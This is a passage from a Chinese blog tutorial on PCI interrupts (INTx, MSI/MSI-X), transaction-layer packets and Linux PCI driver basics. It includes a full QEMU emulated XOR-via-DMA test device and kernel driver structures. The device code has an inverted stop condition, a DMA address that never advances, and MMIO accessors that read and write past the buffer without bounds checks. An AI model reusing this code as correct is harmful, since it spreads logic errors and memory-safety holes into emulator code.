引脚</code> ，下图是一个三 PCI 插槽与中断控制器引脚进行连接的例子：</p><p><img src="https://s2.loli.net/2022/08/31/ZyIur4L7U5oCjJO.png" alt="知乎偷的图"></p><p>还记得我们前文所讲的 PCI 配置空间中的 <code>Interrupt Pin</code> 与 <code>Interrupt Line</code> 域吗？现在我们可以进一步明确其具体用途了：</p><ul><li><code>Interrupt Pin</code>：记录设备应该使用哪一个 INTx 中断信号</li><li><code>Interrupt Line</code>：记录设备连接的引脚</li></ul><p><img src="https://s2.loli.net/2022/08/31/jbtsuypMvza9Nex.png" alt="image.png"></p><h3 id="II-MSI-MSI-X-中断">II. MSI/MSI-X 中断</h3><p><strong>Message Signaled Interrupt</strong> 是一种更为现代化与普遍的 PCI 中断机制，<strong>MSI-eXtend</strong> 则为其升级版，该机制的引入是为了消除 INTx 的边带信号，目前绝大多数 PCIe 设备已不再使用传统的 INTx 中断，而是使用 MSI/MSI-X 提交中断请求</p><p>在 PCIe 设备中有着两个 Capability 结构，分别对应 MSI 与 MSI-X，通常一个 PCIe 设备仅会包含其中一个。对于 MSI 而言其 Capability ID 为 5，一共有四种结构，分别对应 32 位与 64 位的 Message 结构，以及对应的带上中断 Masking 的结构</p><p><img src="https://s2.loli.net/2022/08/31/v657FsLHc9Kx2Aq.png" alt="知乎偷的图"></p><p>MSI/MSI-X 本质上是通过<strong>向特定的内存区域进行写入</strong>来达到中断触发的效果，当 PCI 设备提交请求时，其向 <code>MSI/MSI-x Capability</code> 结构中的 <code>Message Address</code> 地址（PCI总线域）写入 <code>Message Data</code> 数据，从而产生一个存储器写 TLP，由此向处理器提交存储器写请求</p><p>MSI 仅支持 32 个连续的中断向量，而 MSI-X 支持 2048 个非连续的中断向量，但 MSI-X 的中断向量信息并不像 MSI 那样直接存放在配置空间，而是存放在 MMIO 空间中，通过BIR（Base address Indicator Register）与 BAR 来确定其在 MMIO 中的具体位置</p><p><img src="https://s2.loli.net/2022/08/31/QpYXgx5eKczydkE.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/08/31/EXghx6vUV8S1tdN.png" alt="image.png"></p><p>其结构如下图所示：</p><p><img src="https://s2.loli.net/2022/08/31/a1IuvYtj72lS63K.png" alt="image.png"></p><h2 id="八、Transaction-Layer-Package">八、Transaction Layer Package</h2><p>上一节我们提到了一个词叫 <code>TLP</code>，这一节我们简要介绍一下这是一个什么东西</p><p>我们首先需要介绍 PCI 设备底层的通信结构，类似于计网的 OSI 七层模型，PCI 总线也可以由下到上划分为 <strong>物理层（Physical Layer）、数据链路层（Data Link Layer）、事务层（Transaction Layer）</strong>，TLP 即 <strong>Transaction Layer Package</strong>：在事务层进行传输的数据包</p><p><img src="https://s2.loli.net/2022/08/31/QVYRUoA4JWbyFZD.png" alt="image.png"></p><h1>0x02. Linux PCI 驱动编写（🕊）</h1><p>有的时候你可能自己手工糊了一个 PCI 设备（？），万分欢喜地想要直接往自家💻的 PCI 插槽上一插就开用了，但是突然发现<strong>并没有一种万能的 PCI 驱动能够直接适配你自己造的 PCI 设备</strong>，那这个时候我们只好自己动手写一个驱动了：）</p><h2 id="〇、QEMU-PCI-设备模拟">〇、QEMU PCI 设备模拟</h2><p>因为笔者确实没有条件手搓一个 PCI 设备，所以这里只好用 QEMU 来模拟一个，笔者这里实现了一个通过 DMA 提供简单的数据异或功能的 PCI 设备</p><blockquote><p>关于最基础的 QEMU 设备编写、QOM 等，参见<a href="https://arttnba3.cn/2022/07/15/VIRTUALIZATION-0X00-QEMU-PART-I/#0x03-%E7%AE%80%E6%98%93-QEMU-%E8%AE%BE%E5%A4%87%E7%BC%96%E5%86%99">这里</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * arttnba3 PCI test device</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * Copyright (c) 2022 arttnba3</span><br><span class="hljs-comment"> * Author: arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * This programme is just a simple pci device,</span><br><span class="hljs-comment"> * which is cerated for my own learning about qemu.</span><br><span class="hljs-comment"> * You can modify and use it freely.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/osdep.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/pci/pci.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/qdev-properties.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/event_notifier.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/module.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;sysemu/kvm.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qom/object.h&quot;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    A3DEV_STATUS_INIT = <span class="hljs-number">0</span>,<br>    A3DEV_STATUS_READY,<br>    A3DEV_STATUS_RUNNING,<br>    A3DEV_STATUS_STOPPING,<br><br>    A3DEV_STATUS_TYPES,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    A3DEV_REGS_STATUS = <span class="hljs-number">0</span>,<br>    A3DEV_REGS_INSN,<br><br>    A3DEV_REGS_TYPES,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    A3DEV_INSN_START = <span class="hljs-number">0</span>,<br>    A3DEV_INSN_STOP,<br><br>    A3DEV_INSN_TYPES,<br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3EncBufferInfo</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br>    <span class="hljs-type">dma_addr_t</span> addr;<br>    <span class="hljs-type">uint8_t</span> val;<br>    <span class="hljs-type">uint32_t</span> len;<br>&#125; A3EncBufferInfo;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCIDevState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    PCIDevice parent_obj;<br><br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br>    MemoryRegion mmio;<br>    MemoryRegion pmio;<br>    <span class="hljs-type">uint64_t</span> regs[A3DEV_REGS_TYPES];<br>    A3EncBufferInfo enc_buf;<br><br>    QemuThread thread;<br>    QemuMutex lock;<br>&#125; A3PCIDevState;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCIDevClass</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    PCIDeviceClass parent;<br>&#125; A3PCIDevClass;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_A3DEV_PCI <span class="hljs-string">&quot;a3dev-pci&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI(obj) \</span><br><span class="hljs-meta">    OBJECT_CHECK(A3PCIDevState, (obj), TYPE_A3DEV_PCI)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI_GET_CLASS(obj) \</span><br><span class="hljs-meta">    OBJECT_GET_CLASS(A3PCIDevClass, obj, TYPE_A3DEV_PCI)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI_CLASS(klass) \</span><br><span class="hljs-meta">    OBJECT_CLASS_CHECK(A3PCIDevClass, klass, TYPE_A3DEV_PCI)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">a3dev_worker_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(arg);<br>    <span class="hljs-type">uint8_t</span> cb;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> wlen = <span class="hljs-number">0</span>; wlen &lt; ds-&gt;enc_buf.len; wlen++) &#123;<br>        <span class="hljs-keyword">if</span> (ds-&gt;regs[A3DEV_REGS_STATUS] != A3DEV_STATUS_STOPPING) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        pci_dma_read(&amp;ds-&gt;parent_obj, ds-&gt;enc_buf.addr, &amp;cb, <span class="hljs-number">1</span>);<br>        cb ^= ds-&gt;enc_buf.val;<br>        pci_dma_write(&amp;ds-&gt;parent_obj, ds-&gt;enc_buf.addr, &amp;cb, <span class="hljs-number">1</span>);<br>    &#125;<br><br>    ds-&gt;regs[A3DEV_REGS_STATUS] = A3DEV_STATUS_READY;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span><br><span class="hljs-title function_">a3dev_mmio_read</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br><br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">uint64_t</span>*)(((<span class="hljs-type">uint8_t</span>*) &amp;ds-&gt;enc_buf) + addr);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">a3dev_mmio_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br><br>    <span class="hljs-keyword">if</span> (ds-&gt;regs[A3DEV_REGS_STATUS] != A3DEV_STATUS_READY) &#123;<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br><br>    <span class="hljs-keyword">switch</span> (size) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        *(<span class="hljs-type">uint8_t</span>*)(((<span class="hljs-type">uint8_t</span>*) &amp;ds-&gt;enc_buf ) + addr) = val;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        *(<span class="hljs-type">uint16_t</span>*)(((<span class="hljs-type">uint8_t</span>*) &amp;ds-&gt;enc_buf ) + addr) = val;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        *(<span class="hljs-type">uint32_t</span>*)(((<span class="hljs-type">uint8_t</span>*) &amp;ds-&gt;enc_buf ) + addr) = val;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>        *(<span class="hljs-type">uint64_t</span>*)(((<span class="hljs-type">uint8_t</span>*) &amp;ds-&gt;enc_buf ) + addr) = val;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span><br><span class="hljs-title function_">a3dev_pmio_read</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br><br>    <span class="hljs-keyword">switch</span> (addr) &#123;<br>        <span class="hljs-keyword">case</span> A3DEV_REGS_STATUS:<br>            <span class="hljs-keyword">return</span> ds-&gt;regs[A3DEV_REGS_STATUS];<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">a3dev_pmio_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br><br>    qemu_mutex_lock(&amp;ds-&gt;lock);<br><br>    <span class="hljs-keyword">switch</span> (addr) &#123;<br>        <span class="hljs-keyword">case</span> A3DEV_REGS_INSN:<br>            <span class="hljs-keyword">switch</span> (val) &#123;<br>            <span class="hljs-keyword">case</span> A3DEV_INSN_START:<br>                <span class="hljs-keyword">if</span> (ds-&gt;regs[A3DEV_REGS_STATUS] != A3DEV_STATUS_READY) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                ds-&gt;regs[A3DEV_REGS_STATUS] = A3DEV_STATUS_RUNNING;<br>                qemu_thread_create(&amp;ds-&gt;thread, <span class="hljs-string">&quot;a3dev-worker-thread&quot;</span>, <br>                                    a3dev_worker_thread, ds, <br>                                    QEMU_THREAD_DETACHED);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> A3DEV_INSN_STOP:<br>                <span class="hljs-keyword">if</span> (ds-&gt;regs[A3DEV_REGS_STATUS] != A3DEV_STATUS_RUNNING) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                ds-&gt;regs[A3DEV_REGS_STATUS] = A3DEV_STATUS_STOPPING;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    qemu_mutex_unlock(&amp;ds-&gt;lock);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps a3dev_mmio_ops = &#123;<br>    .read = a3dev_mmio_read,<br>    .write = a3dev_mmio_write,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>    .valid = &#123;<br>        .max_access_size = <span class="hljs-number">4</span>,<br>        .min_access_size = <span class="hljs-number">1</span>,<br>        .unaligned = <span class="hljs-literal">true</span>,<br>    &#125;,<br>    .impl = &#123;<br>        .unaligned = <span class="hljs-literal">true</span>,<br>    &#125;,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps a3dev_pmio_ops = &#123;<br>    .read = a3dev_pmio_read,<br>    .write = a3dev_pmio_write,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>    .valid = &#123;<br>        .max_access_size = <span class="hljs-number">4</span>,<br>        .min_access_size = <span class="hljs-number">1</span>,<br>        .unaligned = <span class="hljs-literal">true</span>,<br>    &#125;,<br>    .impl = &#123;<br>        .unaligned = <span class="hljs-literal">true</span>,<br>    &#125;,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_pci_realize</span><span class="hljs-params">(PCIDevice *pci_dev, Error **errp)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(pci_dev);<br><br>    ds-&gt;regs[A3DEV_REGS_STATUS] = A3DEV_STATUS_INIT;<br><br>    memory_region_init_io(&amp;ds-&gt;mmio, OBJECT(ds), &amp;a3dev_mmio_ops,<br>                        pci_dev, <span class="hljs-string">&quot;a3dev-mmio&quot;</span>, <span class="hljs-keyword">sizeof</span>(ds-&gt;enc_buf));<br>    pci_register_bar(pci_dev, <span class="hljs-number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;ds-&gt;mmio);<br>    memory_region_init_io(&amp;ds-&gt;pmio, OBJECT(ds), &amp;a3dev_pmio_ops,<br>                        pci_dev, <span class="hljs-string">&quot;a3dev-pmio&quot;</span>, A3DEV_REGS_TYPES);<br>    pci_register_bar(pci_dev, <span class="hljs-number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;ds-&gt;pmio);<br><br>    <span class="hljs-built_in">memset</span>(&amp;ds-&gt;enc_buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(ds-&gt;enc_buf));<br>    qemu_mutex_init(&amp;ds-&gt;lock);<br><br>    ds-&gt;regs[A3DEV_REGS_STATUS] = A3DEV_STATUS_READY;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_instance_init</span><span class="hljs-params">(Object *obj)</span><br>&#123;<br>    <span class="hljs-comment">// do something</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    DeviceClass *dc = DEVICE_CLASS(oc);<br>    PCIDeviceClass *pci = PCI_DEVICE_CLASS(oc);<br><br>    pci-&gt;realize = a3dev_pci_realize;<br>    pci-&gt;vendor_id = PCI_VENDOR_ID_QEMU;<br>    pci-&gt;device_id = <span class="hljs-number">0x1919</span>;<br>    pci-&gt;revision = <span class="hljs-number">0x81</span>;<br>    pci-&gt;class_id = PCI_CLASS_OTHERS;<br><br>    dc-&gt;desc = <span class="hljs-string">&quot;arttnba3 test PCI device&quot;</span>;<br>    set_bit(DEVICE_CATEGORY_MISC, dc-&gt;categories);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3dev_type_info = &#123;<br>    .name = TYPE_A3DEV_PCI,<br>    .parent = TYPE_PCI_DEVICE,<br>    .instance_init = a3dev_instance_init,<br>    .instance_size = <span class="hljs-keyword">sizeof</span>(A3PCIDevState),<br>    .class_size = <span class="hljs-keyword">sizeof</span>(A3PCIDevClass),<br>    .class_init = a3dev_class_init,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; INTERFACE_CONVENTIONAL_PCI_DEVICE &#125;,<br>        &#123; &#125;,<br>    &#125;,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_register_types</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    type_register_static(&amp;a3dev_type_info);<br>&#125;<br><br>type_init(a3dev_register_types);<br></code></pre></td></tr></table></figure><h2 id="一、kernel-识别-PCI-设备的方式">一、kernel 识别 PCI 设备的方式</h2><h3 id="I-基本结构">I.基本结构</h3><p>我们首先来看 Linux kernel 中的通用设备驱动模型，主要由三部分组成：<strong>总线（bus）、设备（device）、驱动（driver）</strong>，具体的总线类型都是基于这一套机制去实现的</p><p><img src="https://s2.loli.net/2022/09/01/ypQ8KYmIzbZkaUd.png" alt="偷的图"></p><p>对于 PCI 而言，总线中的各个组件在 Linux kernel 中对应的结构体如下图所示：</p><p><img src="https://s2.loli.net/2022/09/01/JtUKnCN7d1BWpxz.png" alt="偷的图"></p><p>下面是一张更加详细的展开图：</p><p><img src="https://s2.loli.net/2022/09/01/y5if1YWOesXJbT3.png" alt="偷的图"></p><p>上面的图只画出了 PCI 的总线（<code>struct pci_bus</code>）与 PCI 设备（<code>struct pci_dev</code>），还少了一个驱动结构，在内核中 PCI 驱动对应的实际上是 <code>pci_driver</code> 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_driver</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span><span class="hljs-title">node</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*name;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_device_id</span> *<span class="hljs-title">id_table</span>;</span><span class="hljs-comment">/* Must be non-NULL for probe to be called */</span><br><span class="hljs-type">int</span>  (*probe)(<span class="hljs-keyword">struct</span> pci_dev *dev, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> pci_device_id *id);<span class="hljs-comment">/* New device inserted */</span><br><span class="hljs-type">void</span> (*remove)(<span class="hljs-keyword">struct</span> pci_dev *dev);<span class="hljs-comment">/* Device removed (NULL if not a hot-plug capable driver) */</span><br><span class="hljs-type">int</span>  (*suspend)(<span class="hljs-keyword">struct</span> pci_dev *dev, <span class="hljs-type">pm_message_t</span> state);<span class="hljs-comment">/* Device suspended */</span><br><span class="hljs-type">int</span>  (*resume)(<span class="hljs-keyword">struct</span> pci_dev *dev);<span class="hljs-comment">/* Device woken up */</span><br><span class="hljs-type">void</span> (*shutdown)(<span class="hljs-keyword">struct</span> pci_dev *dev);<br><span class="hljs-type">int</span>  (*sriov_configure)(<span class="hljs-keyword">struct</span> pci_dev *dev, <span class="hljs-type">int</span> num_vfs); <span class="hljs-comment">/* On PF */</span><br><span class="hljs-type">int</span>  (*sriov_set_msix_vec_count)(<span class="hljs-keyword">struct</span> pci_dev *vf, <span class="hljs-type">int</span> msix_vec_count); <span class="hljs-comment">/* On PF */</span><br>u32  (*sriov_get_vf_total_msix)(<span class="hljs-keyword">struct</span> pci_dev *pf);<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_error_handlers</span> *<span class="hljs-title">err_handler</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">attribute_group</span> **<span class="hljs-title">groups</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">attribute_group</span> **<span class="hljs-title">dev_groups</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device_driver</span><span class="hljs-title">driver</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_dynids</span><span class="hljs-title">dynids</span>;</span><br><span class="hljs-type">bool</span> driver_managed_dma;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="II-识别过程">II.识别过程</h3><p>讲完了基本结构，现在我们可以来看内核是怎么去识别 PCI 设备的了，在内核启动后各架构的初始化函数最终都会调用到 <code>start_kernel()</code>，于是存在如下调用链：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">start_kernel</span>()<br><span class="hljs-built_in">arch_call_rest_init</span>()<br><span class="hljs-built_in">rest_init</span>()<span class="hljs-comment">// 启动三个进程 idle（0）、kernel_init（1）、kthreadd（2）</span><br><span class="hljs-built_in">kernel_init</span>()<br><span class="hljs-built_in">kernel_init_freeable</span>()<br><span class="hljs-built_in">do_basic_setup</span>()<br><span class="hljs-built_in">driver_init</span>()<br><span class="hljs-built_in">devtmpfs_init</span>()<span class="hljs-comment">// 建立 devtmpfs，之后会被用户态init挂到/dev下面</span><br><span class="hljs-built_in">buses_init</span>()<span class="hljs-comment">// 在 sysfs 根下建立 bus 目录</span><br></code></pre></td></tr></table></figure><p>之后就是到各个模块的 init 函数，按照编译链接顺序，我们所关心的 PCI 相关函数的执行顺序应当如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 